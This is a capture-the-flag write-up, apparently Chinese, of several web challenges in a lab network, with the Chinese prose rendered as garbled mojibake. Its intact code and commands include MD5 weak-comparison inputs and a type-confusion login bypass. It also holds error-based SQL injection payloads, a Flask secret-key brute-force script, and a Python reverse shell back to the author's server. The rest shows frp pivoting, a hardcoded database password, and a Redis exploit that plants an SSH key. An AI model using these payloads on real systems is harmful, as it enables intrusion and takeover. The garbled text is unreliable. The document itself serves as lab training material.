å¦‚ä¸‹\nå¯ä»¥çœ‹åˆ°æ˜¯ç›´æ¥echoæ–‡ä»¶å†…å®¹ï¼Œè¿™é‡Œæ˜¯æ— æ³•æ‰§è¡Œå†…éƒ¨phpä»£ç çš„ï¼Œå‘äº†æˆ‘å¥½ä¹…ğŸ˜­\nåˆ°è¿™é‡Œï¼Œå…¶å®è¿™æ ¹æœ¬å°±ä¸æ˜¯ä¸€é“æ–‡ä»¶ä¸Šä¼ é¢˜ï¼ï¼\nå°è¯•åœ¨æ ¹ç›®å½•ä¸‹å¯»æ‰¾flagğŸ‘‡ï¼Œçš„åˆ°å¦ä¸€ä¸ªphpæ–‡ä»¶\nè®¿é—®é‚£ä¸ªphpæ–‡ä»¶ğŸ‘‡\nå¾ˆç®€å•çš„ä¸€ä¸ªMD5å¼±æ¯”è¾ƒ\nåªéœ€è¦MD5å€¼ä¸º0eå¼€å¤´å°±å¯è½»æ¾ç»•è¿‡ï¼Œä¸‹é¢æ˜¯å‡ ä¸ªå¸¸ç”¨çš„MD5å€¼ä¸º0eå¼€å¤´çš„\nQNKCDZO\n240610708\ns878926199a\ns155964671a\ns21587387a\nsignin #\rDESCRIPTION: çœŸçš„æ˜¯signinï¼ˆ **æœ¬é¢˜æ— éœ€æ‰«æå™¨/çˆ†ç ´**\né¢˜ç›®é™„ä»¶é‡Œç»™åˆ°äº†æºç \né»˜è®¤çš„è´¦å·å¯†ç éƒ½æ˜¯admin\nä½†æ˜¯åœ¨æºä»£ç é‡Œå¯ä»¥çœ‹åˆ°å‡ ä¸ªé™åˆ¶æ¡ä»¶\nusernameä¸èƒ½æ˜¯admin\nç„¶åusernameä¸èƒ½å’Œpasswordç›¸åŒ\né‚£ä¹ˆé€šè¿‡äº†è¿™ä¸¤ä¸ªå°±è¦æ¥åˆ°hashæ¯”è¾ƒ\né‚£ä¹ˆè¿™ä¸ªgethashå‡½æ•°å’Œhashå­—å…¸çš„ä»£ç å¦‚ä¸‹ğŸ‘‡\nå¯ä»¥åœ¨æœ¬åœ°è°ƒè¯•ä¸€ä¸‹ï¼Œgethashå‡½æ•°çš„åŸºæœ¬é€»è¾‘å°±æ˜¯éå†å­—å…¸é‡Œçš„é”®å€¼ï¼Œè¿›è¡Œå¼‚æˆ–ï¼Œadminã€adminçš„hashå€¼åº”è¯¥æ˜¯â€˜0â€™ï¼Œç„¶åå°†åŸæœ¬çš„usernameå’Œhashå€¼ä¸€èµ·å‚¨å­˜åˆ°hashed_usersé‡Œ\né‚£ä¹ˆæ¥åˆ°æ¯”è¾ƒhashè¿™ä¸€æ­¥ï¼Œå¾ˆæ˜æ˜¾åœ¨æ¯”è¾ƒè¿™é‡Œåªæ˜¯æ¯”è¾ƒäº†hashå€¼è€Œå¹¶æ²¡æœ‰æ¯”è¾ƒusername\né‚£è¦åšçš„å°±æ˜¯æŠŠhashå€¼å˜ä¸º0ï¼Œå› ä¸ºé»˜è®¤çš„adminç”¨æˆ·å¯†ç äº§ç”Ÿçš„hashedå°±æ˜¯0\nè€Œä¸Šé¢è¯´åˆ°åªæœ‰åœ¨usernameç­‰äºpasswordæ—¶æ‰èƒ½hashä¸º0ï¼Œä½†æ˜¯æ•°å€¼ç›¸ç­‰çš„æƒ…å†µè¢«banäº†\nå…³é”®ç‚¹å°±åœ¨äº\nè¿™ä¸ªå­—ç¬¦ä¸²çš„å¤„ç†ä¼šå°†å„ç§æ•°æ®ç±»å‹å¼ºåˆ¶è½¬æ¢ä¸ºå­—ç¬¦ä¸²\na=\u0026#34;123\u0026#34;\rb=123\rprint(f\u0026#34;{a}{b}\u0026#34;)\rresult:123123 æˆ‘ä»¬å¯ä»¥éšä¾¿æŠ“ä¸ªåŒ…ï¼Œå¹¶æŠŠparamsé‡Œçš„å€¼è¿›è¡Œäº”æ¬¡base64è§£å¯†å¯å¾—ğŸ‘‡\n{\u0026#34;username\u0026#34;:\u0026#34;admin\u0026#34;,\u0026#34;password\u0026#34;:\u0026#34;admin\u0026#34;} å¯ä»¥çœ‹åˆ°å¦‚æœæ˜¯è¿™æ ·çš„è¯ï¼Œè™½ç„¶hashä¸º0ï¼Œç¬¬äºŒå…³æˆ‘ä»¬å°±è¿‡ä¸äº†ï¼Œå› ä¸ºéƒ½æ˜¯å­—ç¬¦ä¸²è€Œä¸”æ•°å€¼è¿˜ä¸€æ ·\nè€Œä¸Šé¢è¯´åˆ°gethashé‡Œçš„å‡½æ•°å¤„ç†æ–¹å¼çš„é—®é¢˜\né‚£ä¹ˆå°±å¯ä»¥å°è¯•æ„é€ usernameå’Œpasswordæ•°å€¼ç›¸åŒä½†æ˜¯æ•°æ®ç±»å‹ä¸ä¸€æ ·\næ¯”å¦‚è¯´ğŸ‘‡\n{\u0026#34;username\u0026#34;:\u0026#34;123\u0026#34;,\u0026#34;password\u0026#34;:123} è¿™åœ¨ç¬¬äºŒæ­¥æ¯”è¾ƒçš„æ—¶å€™ä¼šå› ä¸ºusernameå’Œpasswordçš„ç±»å‹ä¸åŒè€Œç»•è¿‡\nç„¶åæŠŠè¿™æ®µbase64åŠ å¯†äº”æ¬¡å†æŠ“åŒ…ä¸Šä¼ å°±èƒ½å¾—åˆ°flag\nå‡ºå»æ—…æ¸¸çš„å¿ƒæµ· #\rDESCRIPTION: æ¬¢è¿æ¥åˆ°å¿ƒæµ·æ–°å»ºçš„åšå®¢ï¼æ­£å€¼å‡æœŸæœŸé—´ï¼Œå¥¹æŠ“ç´§æ—¶é—´å‡ºå»æ—…æ¸¸æ”¾æ¾ä¸€ä¸‹ï¼Œçœ‹çœ‹å¥¹æœ€è¿‘éƒ½åœ¨ç ”ç©¶ä»€ä¹ˆï¼Ÿ\nflagæ˜¯æ‰“ä¸å¼€çš„ï¼Œè¿›å…¥wordpressæ˜¯ä¸€ä¸ªåšå®¢\nåšå®¢é¡µé¢å³è¾¹æœ‰æ¥è®¿è€…ä¿¡æ¯ï¼Œä½†æ˜¯æ˜¯é€šè¿‡é¡µé¢è„šæœ¬ç›´æ¥è·å¾—çš„ï¼Œä¿®æ”¹ä¹Ÿæ²¡ç”¨\nåœ¨æºä»£ç é‡Œä¹Ÿæœ‰å¤„ç†è¿™äº›ä¿¡æ¯çš„è„šæœ¬ä»£ç ğŸ‘‡\nå¯ä»¥çœ‹åˆ°æ˜¯é€šè¿‡ä¸€ä¸ªapiè·å¾—ä¸»æœºä¿¡æ¯ç„¶åæ˜ å°„åˆ°é¡µé¢ï¼Œæœ€åé€šè¿‡è¿™ä¸ªlogger.php\né‚£æ‰“å¼€logger.phpçœ‹çœ‹ï¼Œå…³é”®ç‚¹çœ‹ç®­å¤´ğŸ‘‡\né¦–å…ˆtimeæ˜¯è¿›è¡Œäº†stripslashesï¼Œå°±æ˜¯ç‰¹æ®Šå­—ç¬¦ä¸ä¼šè¢«è½¬ä¹‰\nå…¶æ¬¡timeåœ¨insertè¯­å¥é‡Œæ²¡æœ‰è¢«å¼•å·åŒ…è£¹ï¼Œå¯ä»¥å°è¯•æ³¨å…¥\næœ€åæ’å…¥å¤±è´¥ä¼šæœ‰æŠ¥é”™ä¿¡æ¯\nç»¼ä¸Šï¼Œåº”è¯¥èƒ½æƒ³åˆ°æ˜¯æŠ¥é”™æ³¨å…¥\nè¿™ä¸ªç»è¿‡æµ‹è¯•ï¼Œipå’Œuser_agentéƒ½æ˜¯varcharç±»å‹çš„ï¼Œä¼ ä¸ä¼ å€¼éƒ½å¯ä»¥ï¼Œtimeåˆ™æ˜¯timeå­—ç¬¦ä¸²ç±»å‹çš„ï¼Œä¸ç¬¦åˆæ—¶é—´ç±»å‹çš„å­—ç¬¦ä¸²æ˜¯ä¼šæŠ¥é”™ï¼Œè€Œä¸”ç”±äºsqlè¯­å¥ä»å·¦å¾€å³è¿›è¡ŒæŠ¥é”™ç»ˆæ­¢ï¼Œå‰é¢æŠ¥é”™äº†ä¼šå¯¼è‡´åˆ°åé¢æŠ¥é”™ä¿¡æ¯çš„ä¸å‡ºç°ï¼ˆå¯ä»¥æœ¬åœ°å¼„ä¸ªmysqlå°è¯•ä¸€ä¸‹\né‚£ä¹ˆå…ˆè¯•è¯•å§ğŸ‘‡å¯ä»¥çœ‹åˆ°çˆ†å‡ºäº†æ•°æ®åº“å\né‚£ä¹ˆå°è¯•çˆ†ä¸€ä¸‹è¡¨å‘¢\nä¼šå‘ç°å³ä½¿åé¢æ³¨å…¥è¯­å¥æ²¡æœ‰é—®é¢˜ï¼ŒtimeåŸæ¥æ˜¯å­—ç¬¦ä¸²æ ¼å¼ï¼Œä½†æ˜¯æœ‰orçš„å­˜åœ¨ï¼Œmysqlä¼šè®¡ç®—ä¸¤ç«¯å­—ç¬¦ä¸²çš„å€¼ï¼Œtimeå°±ä¼šä»¥doubleçš„å½¢å¼è¢«è®¡ç®—ï¼Œæ‰€ä»¥ä¼šæŠ¥é”™\nå…¶å®åªéœ€è¦æŠŠtimeçš„æ—¥æœŸéƒ¨åˆ†æ”¹æˆç©ºå­—ç¬¦ä¸²å°±å¯ä»¥äº†ï¼Œå› ä¸ºåœ¨insertçš„æ—¶å€™æ˜¯å…ˆåˆ¤æ–­è®¡ç®—è¿™ä¸ªtimeçš„è¯­å¥æ˜¯å¦åˆæ³•ï¼Œç„¶åå†æ’å…¥ï¼Œæ’å…¥æ˜¯åé¢çš„äº‹æƒ…ï¼Œæˆ‘ä»¬åœ¨åˆ¤æ–­çš„æ—¶å€™å°±èƒ½çœ‹åˆ°æƒ³è¦çš„æŠ¥é”™ä¿¡æ¯\nip=\u0026amp;user_agent=\u0026amp;time=\u0026#39;\u0026#39; or updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database())),1) ##çˆ†è¡¨å\rip=\u0026amp;user_agent=\u0026amp;time=\u0026#39;\u0026#39; or updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name=\u0026#39;secret_of_kokomi\u0026#39;)),1) ##çˆ†åˆ—å\rip=\u0026amp;user_agent=\u0026amp;time=\u0026#39;\u0026#39; or updatexml(1,concat(\u0026#39;#\u0026#39;,substring((select group_concat(content)from secret_of_kokomi where id=3),1,30)),0) ##çˆ†flag å› ä¸ºæœ‰æŠ¥é”™ä¿¡æ¯é•¿åº¦çš„é™åˆ¶ï¼Œè¿™é‡Œç”¨ä¸€ä¸ªsubstringå°±å¥½äº†\nå½“ç„¶ä¹Ÿå¯ç”¨sqlmapç›´æ¥ä¸€æŠŠæ¢­ã€‚ã€‚\nmoeworld #\rCHALLENGE: moeworld\nDESCRIPTION: ä½ å·²ç»å­¦ä¼šäº†1+1=2ï¼Œæ¥ä¸‹æ¥å°è¯•çœŸå®çš„æ¸—é€å§~\nè§£å‹å¯†ç ä¸ºâ€œå‡ºå»æ—…æ¸¸çš„å¿ƒæµ·â€çš„flag\nå…ˆéšä¾¿æ³¨å†Œä¸€ä¸ªè´¦å·è¿›å»çœ‹åˆ°adminçš„ç•™è¨€\nå¾ˆæ˜æ˜¾æ˜¯è¦è¿›è¡Œsessionä¼ªé€ \nç»™å‡ºäº†éƒ¨åˆ†çš„keyï¼Œè™½ç„¶åé¢éƒ¨åˆ†æ˜¯éšæœºçš„ï¼Œä½†æ˜¯åªæœ‰å››ä½ï¼Œæ˜¯å¯ä»¥è¿›è¡Œçˆ†ç ´çš„\nçˆ†ç ´è„šæœ¬å¦‚ä¸‹ï¼Œè‡ªå·±ä¿®æ”¹cookieğŸ‘‡\n#!/usr/bin/env python3\r\u0026#34;\u0026#34;\u0026#34; Flask Session Cookie Decoder \u0026#34;\u0026#34;\u0026#34;\r__author__ = \u0026#39;Wilson Sumanang, Alexandre ZANNI\u0026#39;\rimport zlib\rfrom itsdangerous import base64_decode\rimport ast\rimport os\rfrom flask.sessions import SecureCookieSessionInterface\rclass MockApp(object):\rdef __init__(self, secret_key):\rself.secret_key = secret_key\rclass FSCM:\r@staticmethod\rdef decode(session_cookie_value, secret_key=None):\rtry:\rif secret_key is None:\rcompressed = False\rpayload = session_cookie_value\rif payload.startswith(\u0026#39;.\u0026#39;):\rcompressed = True\rpayload = payload[1:]\rdata = payload.split(\u0026#34;.\u0026#34;)[0]\rdata = base64_decode(data)\rif compressed:\rdata = zlib.decompress(data)\rreturn data\relse:\rapp = MockApp(secret_key)\rsi = SecureCookieSessionInterface()\rs = si.get_signing_serializer(app)\rreturn s.loads(session_cookie_value)\rexcept Exception as e:\rreturn \u0026#34;[Decoding error] {}\u0026#34;.format(e)\rif __name__ == \u0026#34;__main__\u0026#34;:\rcnt=1\rwhile True:\rcookie_value = \u0026#39;eyJwb3dlciI6Imd1ZXN0IiwidXNlciI6ImFzZCJ9.ZPabPw.NC1Zaj2Hgq5v8GDo0SVtc3qC6Ek\u0026#39;\rsecret_key = \u0026#34;This-random-secretKey-you-can\u0026#39;t-get\u0026#34;+os.urandom(2).hex()\rif secret_key:\rresult = FSCM.decode(cookie_value, secret_key)\relse:\rresult = FSCM.decode(cookie_value)\rcnt+=1\rprint(result,cnt)\rif \u0026#39;power\u0026#39; in result:\rprint(result,secret_key,\u0026#39;YES\u0026#39;)\rbreak çˆ†ç ´åï¼Œåˆ©ç”¨adminçš„sessionè¿›å…¥ï¼Œçœ‹åˆ°adminç•™ä¸‹çš„pinç \nè¿›å…¥ç½‘ç«™ä¸‹çš„/consoleï¼Œè¿›è¡Œå‘½ä»¤æ‰§è¡Œ\nè¿™é‡Œä¸ºäº†æ–¹ä¾¿æ“ä½œï¼Œæˆ‘æŠŠshellåå¼¹åˆ°äº†æˆ‘è‡ªå·±çš„æœåŠ¡å™¨ä¸Š\nnc -lvnp port\r//æ‰“å¼€è‡ªå·±æœåŠ¡å™¨çš„ç«¯å£ç›‘å¬\r//å°†ä¸‹é¢çš„å‘½ä»¤ä¿®æ”¹ä¸ºè‡ªå·±çš„ipå’Œç«¯å£ï¼Œå…¨éƒ¨å¤åˆ¶åˆ°consoleæ‰§è¡Œå°±èƒ½å¾—åˆ°shellæƒé™\rimport socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026#34;ip\u0026#34;,port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\u0026#34;/bin/sh\u0026#34;,\u0026#34;-i\u0026#34;]); åœ¨æ ¹ç›®å½•ä¸‹æ‰¾åˆ°éƒ¨åˆ†flag\n$ cat /flag\rOh! You discovered the secret of my blog.\rBut I divided the flag into three sections,hahaha.\rThis is the first part of the flag\rmoectf{Information-leakage-Is-dangerous! ç„¶åä¸‹é¢æ˜¯reademeğŸ‘‡\n$ cat /readme æ­å–œä½ é€šè¿‡å¤–ç½‘æ¸—é€æ‹¿ä¸‹äº†æœ¬å°æœåŠ¡å™¨çš„æƒé™\ræ¥ä¸‹æ¥ï¼Œä½ éœ€è¦å°è¯•å†…ç½‘æ¸—é€ï¼Œæœ¬æœåŠ¡å™¨çš„/app/toolsç›®å½•ä¸‹å†…ç½®äº†fscan\rä½ éœ€è¦äº†è§£å®ƒçš„åŸºæœ¬ç”¨æ³•ï¼Œç„¶åæ‰«æå†…ç½‘çš„ipæ®µ\rå¦‚æœä½ è¿›è¡Œäº†æ­£ç¡®çš„æ“ä½œï¼Œä¼šå¾—åˆ°ç±»ä¼¼ä¸‹é¢çš„ç»“æœ\r10.1.11.11:22 open\r10.1.23.21:8080 open\r10.1.23.23:9000 open\rå°†ä½ å¾—åˆ°çš„è‹¥å¹²ä¸ªç«¯å£å·ä»å°åˆ°å¤§æ’åºå¹¶ä»¥ - åˆ†å‰²ï¼Œè¿™ä¸€ä¸²å³ä¸ºhint.zipå‹ç¼©åŒ…çš„å¯†ç ï¼ˆæœ¬ä¾‹ä¸­ï¼Œå¯†ç ä¸ºï¼š22-8080-9000ï¼‰\ræ³¨æ„ï¼šè¯·å¿½ç•¥æ‰xx.xx.xx.1ï¼Œä¾‹å¦‚æ‰«å‡ºä¸‰ä¸ªip 192.168.0.1 192.168.0.2 192.168.0.3 ï¼Œè¯·å¿½ç•¥æ‰æœ‰å…³192.168.0.1çš„æ‰€æœ‰ç»“æœï¼æ­¤ä¸ºå‡ºé¢˜äººæœåŠ¡å™¨ä¸Šçš„å…¶å®ƒæ­£å¸¸æœåŠ¡\rå¯¹å¯†ç æœ‰ç–‘é—®éšæ—¶å’¨è¯¢å‡ºé¢˜äºº$ è¦ä½¿ç”¨fscançš„è¯é¦–å…ˆè¦çŸ¥é“å†…ç½‘ipæ˜¯å¤šå°‘\nè¿™é‡Œè¦è¿›å…¥ /etc/hosts è¿›è¡ŒæŸ¥çœ‹å­˜æ´»ä¸»æœº\ncat /etc/hosts\r127.0.0.1 localhost\r::1 localhost ip6-localhost ip6-loopback\rfe00::0 ip6-localnet\rff00::0 ip6-mcastprefix\rff02::1 ip6-allnodes\rff02::2 ip6-allrouters\r172.20.0.4 7ce8be7b3d4a\r172.21.0.3 7ce8be7b3d4a ç„¶åè¿›è¡Œæ‰«æğŸ‘‡\næŒ‰ç…§è¦æ±‚æ’åºç«¯å£ï¼Œå¾—åˆ°å¯†ç 22-3306-6379-8080\nè§£å‹hintğŸ‘‡\nå½“ä½ çœ‹åˆ°æ­¤éƒ¨åˆ†ï¼Œè¯æ˜ä½ æ­£ç¡®çš„è¿›è¡Œäº†fscançš„æ“ä½œå¾—åˆ°äº†æ­£ç¡®çš„ç»“æœ\rå¯ä»¥çœ‹åˆ°ï¼Œåœ¨æœ¬å†…ç½‘ä¸‹è¿˜æœ‰å¦å¤–ä¸¤å°æœåŠ¡å™¨\rå…¶ä¸­ä¸€å°å¼€å¯äº†22(ssh)å’Œ6379(redis)ç«¯å£\rå¦ä¸€å°å¼€å¯äº†3306(mysql)ç«¯å£\rè¿˜æœ‰ä¸€å°æ­£æ˜¯ä½ è®¿é—®åˆ°çš„ç•™è¨€æ¿æœåŠ¡\ræ¥ä¸‹æ¥ï¼Œä½ å¯èƒ½éœ€è¦æ­å»ºä»£ç†ï¼Œä»è€Œä½¿ä½ çš„æœ¬æœºèƒ½ç›´æ¥è®¿é—®åˆ°å†…ç½‘çš„æœåŠ¡å™¨\ræ­¤å¤„å¯äº†è§£`nps`å’Œ`frp`ï¼ŒåŒæ ·åœ¨/app/toolså·²å†…ç½®äº†ç›¸åº”æ–‡ä»¶\rè¿æ¥ä»£ç†ï¼Œæ¨è`proxychains`\rå¯¹äºmysqlæœåŠ¡å™¨ï¼Œä½ éœ€è¦æ‰¾åˆ°å…¶è´¦å·å¯†ç å¹¶æˆåŠŸè¿æ¥ï¼Œåœ¨æ•°æ®åº“ä¸­æ‰¾åˆ°flag2\rå¯¹äºredisæœåŠ¡å™¨ï¼Œä½ å¯ä»¥å­¦ä¹ å…¶ç›¸å…³çš„æ¸—é€æŠ€å·§ï¼Œä»è€Œè·å–åˆ°redisçš„æƒé™ï¼Œå¹¶è¿›ä¸€æ­¥å¯»æ‰¾å…¶getshellçš„æ–¹å¼ï¼Œæœ€ç»ˆå¾—åˆ°flag3 å…ˆæ¥åšmysqlæœåŠ¡å™¨çš„éƒ¨åˆ†\nåœ¨appæ–‡ä»¶å¤¹é‡Œæœ‰ä¸ªdatasqlçš„pyæ–‡ä»¶ï¼Œé‡Œé¢æœ‰è¿æ¥æ•°æ®åº“çš„ç›¸å…³ä¿¡æ¯\ndb = pymysql.connect(\rhost=\u0026#34;mysql\u0026#34;, # æ•°æ®åº“åœ°å€\rport=3306, # æ•°æ®åº“ç«¯å£\ruser=\u0026#34;root\u0026#34;, # æ•°æ®åº“ç”¨æˆ·å\rpasswd=\u0026#34;The_P0sswOrD_Y0u_Nev3r_Kn0w\u0026#34;, # æ•°æ®åº“å¯†ç \rdatabase=\u0026#34;messageboard\u0026#34;, # æ•°æ®åº“å\rcharset=\u0026#39;utf8\u0026#39;\r) æ¥ä¸‹æ¥å°±æ˜¯å¼€å¯ä»£ç†çš„æ­¥éª¤\néœ€è¦æœ‰ä¸€å°æœ‰å…¬ç½‘IPçš„æœåŠ¡å™¨ï¼ˆå°±åƒæˆ‘è¿™ä¸ªåšå®¢ä¸€æ ·ä¹Ÿæ˜¯ä¸€ä¸ªæœåŠ¡å™¨ï¼‰ï¼Œç„¶åè¿˜è¦ä¸€ä¸ªè™šæ‹Ÿæœºkali\nfrpè¿™ä¸ªå·¥å…·ï¼Œå¯ä»¥æœä¸€æœå…·ä½“çš„ä½¿ç”¨æ–¹æ³•\nåœ¨toolsé‡Œå­˜æœ‰frpçš„å®¢æˆ·ç«¯çš„iniï¼Œåªä¸è¿‡é‡Œé¢çš„é…ç½®æ— æ³•ä½¿ç”¨\nå›æƒ³èµ·æ¥å‡ºé¢˜äººåœ¨ç¾¤é‡Œæè¿‡ä¸€å¥å†™æ–‡ä»¶è¦åˆ°tmpç›®å½•ä¸‹\né‚£ä¹ˆå°±åº”è¯¥æ˜¯è¦æˆ‘ä»¬è‡ªå·±åˆ°tmpç›®å½•ä¸‹åˆ›å»ºèƒ½å¤Ÿä½¿ç”¨çš„frpé…ç½®æ–‡ä»¶\nè¿™é‡Œé¶æœºæ˜¯å®¢æˆ·ç«¯ï¼Œé‚£ä¹ˆå®¢æˆ·ç«¯é…ç½®æ–‡ä»¶çš„å†™æ³•æ¯”è¾ƒç®€å•\nç”±äºvimä¸èƒ½ä½¿ç”¨ï¼Œé‚£å°±ç”¨\u0026gt;å°–æ‹¬å·é…åˆechoæ¥åˆ›å»ºæ–‡ä»¶ï¼Œè®°å¾—åˆ‡æ¢ç›®å½•åˆ°tmpï¼ˆä¸­æ–‡æ˜¯è¦æ”¹çš„éƒ¨åˆ†\necho \u0026#39;[common]\\nserver_addr = è‡ªå·±çš„å…¬ç½‘æœåŠ¡å™¨IP\\nserver_port = ç¨åä¼šç”¨ä½œä»£ç†çš„ç«¯å£\\ntoken = å¯¹æ¥å¯†ç \\n\\n[plugin_socks5]\\ntype = tcp\\nplugin = socks5\\nremote_port = ç”¨äºè¿æ¥frpçš„ç«¯å£\\n\u0026#39; \u0026gt; frpc.ini åŒæ—¶æˆ‘ä»¬è‡ªå·±çš„å…¬ç½‘æœåŠ¡å™¨ä¹Ÿè¦ä¸‹è½½frpè¿™ä¸ªæ–‡ä»¶\nå…·ä½“ä»£ç å¦‚ä¸‹\n#å®‰è£…\rwget https://github.com/fatedier/frp/releases/download/v0.38.0/frp_0.38.0_linux_amd64.tar.gz\r#è§£å‹\rtar -xzvf frp_0.38.0_linux_amd64.tar.gz ä¿®æ”¹è‡ªå·±æœåŠ¡å™¨çš„çš„frps.ini\n[common]\rbind_port = ç”¨äºfrpçš„ç«¯å£#è¿™ä¸ªæ˜¯æœåŠ¡å™¨ä¸Šå»ºç«‹è¿æ¥çš„ç«¯å£\rtoken = å¯¹æ¥å¯†ç # è¿™ä¸ªtokenåœ¨å®¢æˆ·ç«¯ä¼šç”¨åˆ° ç„¶åæ‰§è¡Œä»¥ä¸‹å‘½ä»¤\nåœ¨è‡ªå·±æœåŠ¡å™¨ä¸Šï¼š ./frps -c frps.ini\råœ¨é¶æœºä¸Šï¼šè¿›å…¥frpç›®å½• ./frpc -c /tmp/frpc.ini å¦‚æœæˆåŠŸä¼šçœ‹åˆ°è¿™æ ·çš„æˆªå›¾ğŸ‘‡\nè¿™å°±è¯´æ˜é¶æœºå’Œè‡ªå·±çš„æœåŠ¡å™¨å·²ç»æˆåŠŸå»ºç«‹è¿æ¥ï¼Œè‡ªå·±çš„æœåŠ¡å™¨å·²ç»å¤„äºé¶æœºçš„å†…ç½‘ç¯å¢ƒä¸‹\nå¹¶ä¸”è‡ªå·±çš„æœåŠ¡å™¨å¼€å¯äº†socks5ä»£ç†ï¼Œå¹¶ä¸”å¯ä»¥é€šè¿‡è¿™ä¸ªä»£ç†è®¿é—®å†…ç½‘å…¶ä»–çš„ä¸»æœº\nç„¶åè¿›å…¥kali\n#è¿›å…¥root\rsudo su\r#ç„¶åä¿®æ”¹proxychainsçš„é…ç½®\rvim /etc/proxychains4.conf å¦‚å›¾ğŸ‘‡\nä¸­é—´ç”¨ç©ºæ ¼éš”å¼€ï¼Œä¿å­˜é€€å‡ºï¼Œç„¶åæ‰§è¡Œä»¥ä¸‹å‘½ä»¤\nproxychains4 mysql -uroot -pThe_P0sswOrD_Y0u_Nev3r_Kn0w -h172.20.0.3\r#é€‰é¡¹å’Œå‚æ•°ä¹‹é—´åŠ ç©ºæ ¼å°±è¦è‡ªå·±è¾“å…¥å¯†ç \r#ä¸åŠ ç©ºæ ¼å°±é»˜è®¤åé¢çš„å­—ç¬¦ä¸²ä¸ºå¯†ç  å°±èƒ½æˆåŠŸè¿æ¥mysqlï¼Œæ‰¾åˆ°ä¸­é—´éƒ¨åˆ†çš„flag\næœ€åå°±åªå‰©ä¸‹redisçš„éƒ¨åˆ†äº†\næ€è·¯ï¼šå…ˆåœ¨è‡ªå·±çš„ä¸»æœºä¸Šç”Ÿæˆå…¬ç§é’¥å¯¹ï¼Œåˆ©ç”¨redisçš„æ•°æ®å¤‡ä»½åŠŸèƒ½ï¼Œå°†è‡ªå·±çš„å…¬é’¥å†™å…¥åˆ°ç›®æ ‡æœåŠ¡å™¨çš„/etc/authorized_keysä¸­ï¼Œç„¶åä½¿ç”¨sshçš„ç§é’¥ç›´æ¥ç™»å½•ç›®æ ‡æœåŠ¡å™¨ã€‚\né¦–å…ˆåœ¨è‡ªå·±çš„kaliä¸Šç”Ÿæˆå…¬ç§é’¥\nssh-keygen -t rsa\r#ç„¶åä¼šå‡ºç°å‡ ä¸ªç©ºè®©ä½ å¡«ï¼Œç›´æ¥å…¨éƒ¨å›è½¦å°±å¥½\r#åœ¨/root/.ssh ç›®å½•ä¸‹ä¼šç”Ÿæˆä¸¤ä¸ªæ–‡ä»¶ï¼Œä¸€ä¸ªæ˜¯key ä¸€ä¸ªæ˜¯key.pubï¼ˆå…¬é’¥\r#è®°å¾—å¤åˆ¶è¿™ä¸ªå…¬é’¥ ç„¶åredisæœ‰ä¸ªæœªæˆæƒè®¿é—®æ¼æ´ï¼Œä½†æ˜¯åªèƒ½å†™æ–‡ä»¶ï¼Œä¸èƒ½è¯»å–\næˆ‘ä»¬çš„ç›®çš„å°±æ˜¯è¦å°†æˆ‘ä»¬è‡ªå·±çš„å…¬é’¥å†™å…¥redis\nåœ¨kaliç«¯æ‰§è¡ŒğŸ‘‡\nproxychains4 redis-cli -h 172.20.0.2 è¿›å…¥äº¤äº’ï¼Œå†™å…¥å…¬é’¥ğŸ‘‡\nconfig set dir /root/.ssh\rconfig set dbfilename authorized_keys\rset key \u0026#34;\\n\\nç”Ÿæˆçš„å…¬é’¥\\n\\n\u0026#34;\rsave\r#æ¯æ¡å‘½ä»¤æ‰§è¡Œå®Œåéƒ½åº”è¯¥æ˜¯OKï¼Œå¦‚æœé”™äº†å°±é‡æ¥ å¦‚å›¾æ‰€ç¤ºå°±æˆåŠŸäº†ğŸ‘‡\næ‹¿åˆ°æœ€ç»ˆflagğŸ‘‡\nè¿‡ç¨‹ä¸­ä¿æŒfrpçš„å¼€å¯å°±è¡Œäº†\nè‰°éš¾AKã€‚ã€‚ã€‚ã€‚\nRE #\rbase_64 #\rDESCRIPTION: base64æ˜¯ä¸€ç§ç¼–ç æ–¹å¼ï¼Œä¸è¿‡è¿™ä¸ªå¥½åƒæœ‰ç‚¹å¥‡æ€ªï¼Ÿ\nhint:pycæ–‡ä»¶çš„åç¼–è¯‘å¯ä»¥è¯•è¯•pycdc,æˆ–è€…æ‰¾æ‰¾åœ¨çº¿çš„åç¼–è¯‘å·¥å…·\nä¸‹è½½ä¸‹æ¥æ˜¯ä¸€ä¸ªpycæ–‡ä»¶\npycï¼šå½“pythonç¨‹åºè¿è¡Œæ—¶ï¼Œç¼–è¯‘çš„ç»“æœæ˜¯ä¿å­˜äºPyCodeObjectï¼Œç¨‹åºè¿è¡Œç»“æŸåï¼ŒPythonå°±å°†PyCodeObjectå†™å…¥åˆ°pycæ–‡ä»¶ä¸­ï¼Œè¿™æ˜¯ä¸ªå­—èŠ‚ç æ–‡ä»¶ã€‚\nå¯ä»¥æ‰¾ç½‘ä¸Šçš„pycåç¼–è¯‘ç½‘å€ğŸ‘‡\nå¯ä»¥çœ‹åˆ°å­—å…¸æ˜¯è¢«æ¢äº†ï¼Œç”¨æ™®é€šçš„base64æ˜¯æ— æ³•è§£å‡ºæ¥çš„\nè¿™é‡Œçš„è¯ï¼Œå¯ä»¥æ‰¾ç½‘ä¸Šçš„base64ä»£ç æ¥ä¿®æ”¹å­—å…¸\nä½†æ˜¯åœ¨ç½‘ç«™é‡Œæœ‰æ›´æ–¹ä¾¿çš„æ–¹æ³•ğŸ‘‰CyberChef (1357310795.github.io)ï¼Œå°±ä¸ç”¨å†å†™ä»£ç äº†\nUPX! #\rDESCRIPTION: æµ®å°äº‘æŠŠè‡ªå·±çè—çš„flagé”åœ¨UPXé‡Œäº†ï¼Œè¿™æ ·åº”è¯¥å°±ä¸‡æ— ä¸€å¤±äº†å§ï¼Ÿ\næ³¨æ„ï¼šå¯ä»¥å…ˆåšxorã€‚å¦‚æœå¯¹è¿™é“é¢˜æ„Ÿåˆ°å›°éš¾ï¼Œè‡ªè¡Œæœç´¢å­¦ä¹ UPXæ˜¯ä»€ä¹ˆã€‚\nä¸Šç½‘æœç´¢ä¸€ä¸‹UPXçš„ç›¸å…³çŸ¥è¯†ï¼Œå¾—çŸ¥æ–‡ä»¶å¯ä»¥è¿›è¡ŒUPXåŠ å£³ï¼Œé˜²æ­¢åç¼–è¯‘\nupxè„±å£³åŠ å£³å·¥å…·æ˜¯ä¸€æ¬¾å¯ä»¥ä¸“é—¨ç”¨æ¥è¿›è¡Œæ–‡ä»¶è„±å£³å’ŒåŠ 